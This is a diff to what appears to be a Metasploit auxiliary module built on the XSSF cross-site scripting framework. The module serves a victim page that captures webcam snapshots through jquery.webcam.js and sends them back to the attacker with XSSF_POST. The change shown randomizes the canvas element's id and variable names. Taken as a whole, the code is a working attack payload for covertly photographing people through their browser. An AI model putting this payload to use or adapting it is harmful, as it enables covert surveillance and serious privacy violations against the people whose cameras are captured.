@@ -26,6 +26,8 @@ class Metasploit3 < Msf::Auxiliary
 	# Part sent to the victim, insert your code here !!!
 	def on_request_uri(cli, req)
 		if (req.uri =~ /\.html/)
+			random = Rex::Text.rand_text_alphanumeric(rand(10) + 5)
+			
 			code = %Q{
 				<html>
 					<head>
@@ -33,14 +35,14 @@ class Metasploit3 < Msf::Auxiliary
 						<script type="text/javascript" src="jquery.webcam.js"></script>
 						
 						<style type="text/css">
-							#webcam, #canvas { 	width: 320px; 	border:20px solid #333; 	background:#eee; 	-webkit-border-radius: 20px; 	-moz-border-radius: 20px; border-radius: 20px; }
+							#webcam, #canvas#{random} { 	width: 320px; 	border:20px solid #333; 	background:#eee; 	-webkit-border-radius: 20px; 	-moz-border-radius: 20px; border-radius: 20px; }
 							#webcam {	position:relative;	margin-top:50px;	margin-bottom:50px; }
 							#webcam > span {	z-index:2;	position:absolute;	color:#eee;	font-size:10px;	bottom: -16px;	left:152px; }
 							#webcam > img {	z-index:1;	position:absolute;	border:0px none;	padding:0px;	bottom:-40px;	left:89px; }
 							#webcam > div {	border:5px solid #333;	position:absolute;	right:-90px;	padding:5px;	-webkit-border-radius: 8px;	-moz-border-radius: 8px;	border-radius: 8px;	cursor:pointer; }
 							#webcam a {	background:#fff;	font-weight:bold; }
 							#webcam a > img {	border:0px none; } 
-							#canvas {	border:20px solid #ccc;	background:#eee; }
+							#canvas#{random} {	border:20px solid #ccc;	background:#eee; }
 							#flash {	position:absolute;	top:0px;	left:0px;	z-index:5000;	width:100%;	height:500px;	background-color:#c00; 	display:none; }
 							object {	display:block; /* HTML5 fix */	position:relative;	z-index:1000; }
 						</style>
@@ -49,7 +51,7 @@ class Metasploit3 < Msf::Auxiliary
 
 						<div id="webcam"><img src='data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAKIAAAFuBAMAAADwgd5TAAAAA3NCSVQICAjb4U/gAAAAMFBMVEX///8zMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzMzOGvfDjAAAAEHRSTlMAESIzRFVmd4iZqrvM3e7/dpUBFQAAAAlwSFlzAAALEgAACxIB0t1+/AAAABZ0RVh0Q3JlYXRpb24gVGltZQAwOS8xMi8xMAU3cskAAAAfdEVYdFNvZnR3YXJlAE1hY3JvbWVkaWEgRmlyZXdvcmtzIDi1aNJ4AAADUklEQVR4nO2dr48TQRTH99otLdcTWESPGhwpCASuTSgCDPwHPYFAIEhwmFZwghCyQPCcAF0MCRh6IQTbkCBwDUhMw6/w42iHnZlNoJ2ZnfdmN6jvR+7b+e68NzPfnanYRhEAAID/T9wObFjp2a9fFeJRkOAFIV7brp8QKaMAwYZs+NK8vjGTgR8BiolsuDhiXN8Uih5bMNYN94xAVwf22YpbuuEXI5DowGe24knd0KzXRAe+shUv6oYHLsXvbMWhR7HEPmaP+sRWPOZKLivwE7Zi0zWkjYLzcWRGpoX6+NsSOVporO/ZQudnSyGWp5iC1bkQ88UDVzRgGcpFmNOLId99kvxKtdijLUf6TYF4QB/SHH6xFMe+OslH7jAED3mTkml/YCh2/IUf21zEzcRfpe30odfIgvX07veee2rWV4YL+XK65LtpbH1T2pFvZP/U2GbsAxqEpHVpvhEVB7Sip8O3pKW9MadNjA7Zd5vEyVsn++6QOtMmRN+tEpPWb8V9wn1b5E1NnbjrS+jLa0ry3djxBrTRJflui7FeZdr+xTXmeMqM4LvSaxdUQbXd8k3dDmsj17Du3laZMBwlOzfk10jWmux6kU47fxy7zN3rYV8PVBZ3GYrSp3KrJCtN9LyMgcd3fXGTzfw+qBz2WIqqidt3m+ykdVpu3x2yk8564fLdan4GdirzHN+VXrtsMxVVYi7fTYKOAE336SYOO6aotO2+2wpKWqdt991xUNLZ2X7HEpBeG/BbgT7cWH1Xem3eEcbN0OG7k8Cks7RN362HJp1NEtN3u2GHZkVi813ltSE/NElatpO4OtnzzmV/UWmvW8ygQNJRdLrf758lXAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4qd6Yixw+Xg/QjO849RY3A/t5ZmYXfBf0LVtFbWITfBqsl1J5aAreLyKYFtNI/G0xQf0p8X/5WVQwitby5nyG3EFzRZDzRxsuaiuK3C9y24hXFPn/RWRSfh/Lr2OyOtajwoKlz8d4ur5mXhUTLH1d18amoBCPwwXL9seyPbzs98zx23lyioPdNlkuvvLCqydZPrtMkTt3iyaXiT7f7a0J/AHxN1p6n6es5QAAAABJRU5ErkJggg==' alt=''/><span>Webcam!</span></div>
 
-						<canvas id="canvas" height="240" width="320" style="display:none"></canvas>
+						<canvas id="canvas#{random}" height="240" width="320" style="display:none"></canvas>
 
 						<script type="text/javascript">
 							var captureloop = null;
@@ -91,10 +93,10 @@ class Metasploit3 < Msf::Auxiliary
 							});
 
 							window.addEventListener("load", function() {
-								var canvas = document.getElementById("canvas");
+								var canvas#{random} = document.getElementById("canvas#{random}");
 
-								if (canvas.getContext) {
-									ctx = document.getElementById("canvas").getContext("2d");
+								if (canvas#{random}.getContext) {
+									ctx = document.getElementById("canvas#{random}").getContext("2d");
 									ctx.clearRect(0, 0, 320, 240);
 									image = ctx.getImageData(0, 0, 320, 240);
 								}
@@ -102,7 +104,7 @@ class Metasploit3 < Msf::Auxiliary
 							
 							function takePicture() {
 								webcam.capture();
-								XSSF_POST(document.getElementById("canvas").toDataURL("image/png"), '#{self.name}');
+								XSSF_POST(document.getElementById("canvas#{random}").toDataURL("image/png"), '#{self.name}');
 								
 								nbcaptures--;
 								
